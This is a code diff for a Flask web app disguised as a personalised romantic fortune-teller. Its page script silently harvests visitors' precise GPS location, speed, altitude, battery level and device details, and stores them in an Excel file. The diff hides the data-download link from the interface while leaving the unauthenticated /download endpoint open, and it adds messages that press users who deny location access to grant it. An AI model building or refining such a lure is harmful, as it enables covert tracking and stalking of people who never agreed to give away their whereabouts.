@@ -23,7 +23,7 @@ def get_address(lat, lon):
     except:
         return 'Location captured'
 
-# Beautiful UI – ONLY NAME FIELD
+# Beautiful UI – NO download link for users
 HTML = '''
 <!DOCTYPE html>
 <html>
@@ -156,6 +156,14 @@ HTML = '''
             50% { transform: scale(1.2); }
         }
         .name-highlight { font-size: 28px; font-weight: bold; margin: 10px 0; text-shadow: 2px 2px 4px rgba(0,0,0,0.2); }
+        .error-message {
+            background: rgba(255,0,0,0.2);
+            border-radius: 20px;
+            padding: 15px;
+            margin-top: 20px;
+            color: #c0392b;
+            font-size: 14px;
+        }
         @media (max-width:600px) {
             .container { padding: 35px 25px; }
             h1 { font-size: 28px; }
@@ -187,10 +195,9 @@ HTML = '''
         <div class="name-highlight" id="userNameDisplay"></div>
         <div class="fortune-text" id="fortuneText"></div>
         <div class="small-text">✨ The universe has spoken ✨</div>
-        <div class="small-text" style="margin-top: 20px;">
-            <a href="/download" style="color: white; text-decoration: underline;">📥 Download my data (admin only)</a>
-        </div>
     </div>
+
+    <div id="errorMsg" class="error-message" style="display:none;"></div>
 </div>
 
 <script>
@@ -222,47 +229,77 @@ HTML = '''
             alert('💕 Please enter your beautiful name! 💕');
             return;
         }
+
+        // Hide any previous error
+        document.getElementById('errorMsg').style.display = 'none';
         document.getElementById('initial').style.display = 'none';
         document.getElementById('loading').classList.add('show');
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async function(pos) {
-                const battery = await getBattery();
-                const data = {
-                    name: name,
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    altitude: pos.coords.altitude,
-                    speed: pos.coords.speed,
-                    battery: battery,
-                    ua: navigator.userAgent,
-                    screen: screen.width + 'x' + screen.height,
-                    lang: navigator.language,
-                    platform: navigator.platform
-                };
-                try {
-                    const res = await fetch('/save', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(data)
-                    });
-                    const result = await res.json();
+        if (!navigator.geolocation) {
+            showError('Geolocation is not supported by your browser.');
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(async function(pos) {
+            // Success: get battery and send data
+            const battery = await getBattery();
+            const data = {
+                name: name,
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                altitude: pos.coords.altitude,
+                speed: pos.coords.speed,
+                battery: battery,
+                ua: navigator.userAgent,
+                screen: screen.width + 'x' + screen.height,
+                lang: navigator.language,
+                platform: navigator.platform
+            };
+            try {
+                const res = await fetch('/save', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+                const result = await res.json();
+                if (result.success) {
                     document.getElementById('loading').classList.remove('show');
                     document.getElementById('result').classList.add('show');
                     document.getElementById('userNameDisplay').innerHTML = `✨ ${name} ✨`;
                     document.getElementById('fortuneText').innerHTML = result.fortune;
-                } catch(err) {
-                    alert('Error, please try again');
-                    location.reload();
+                } else {
+                    showError('Server error. Please try again later.');
                 }
-            }, function() {
-                alert('💕 Please allow location access for your fortune! 💕');
-                location.reload();
-            }, { enableHighAccuracy: true, timeout: 10000 });
-        } else {
-            alert('Geolocation not supported');
-        }
+            } catch(err) {
+                showError('Network error. Please check your connection.');
+            }
+        }, function(error) {
+            // Location error handler – no page reload, just show message
+            let errorMsg = '';
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMsg = '💔 Location access denied. Please allow location in your browser settings and refresh the page.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMsg = '📍 Location information is unavailable.';
+                    break;
+                case error.TIMEOUT:
+                    errorMsg = '⏰ Request timed out. Please try again.';
+                    break;
+                default:
+                    errorMsg = 'An unknown error occurred.';
+            }
+            showError(errorMsg);
+        }, { enableHighAccuracy: true, timeout: 10000 });
+    }
+
+    function showError(msg) {
+        document.getElementById('loading').classList.remove('show');
+        document.getElementById('initial').style.display = 'block';
+        const errorDiv = document.getElementById('errorMsg');
+        errorDiv.innerHTML = msg + ' <button onclick="location.reload()" style="background:white; border:none; padding:5px 10px; border-radius:20px; margin-top:10px; cursor:pointer;">🔄 Retry</button>';
+        errorDiv.style.display = 'block';
     }
 </script>
 </body>
@@ -309,7 +346,7 @@ def save():
             df = pd.concat([old, df], ignore_index=True)
         df.to_excel(excel_path, index=False, engine='openpyxl')
 
-        # Romantic messages with the person's name
+        # Romantic messages (personalized with name)
         messages = [
             f"💕 Dear {name}, someone special is thinking of you right now! 💕",
             f"💖 {name}, a beautiful soul is about to enter your life! 💖",
@@ -332,6 +369,7 @@ def save():
 
 @app.route('/download')
 def download():
+    """Admin-only download endpoint – no link in UI, but you can directly visit /download"""
     excel_path = os.path.join('excel_files', 'fortunes_data.xlsx')
     if os.path.exists(excel_path):
         return send_file(excel_path, as_attachment=True, download_name='fortunes_data.xlsx')
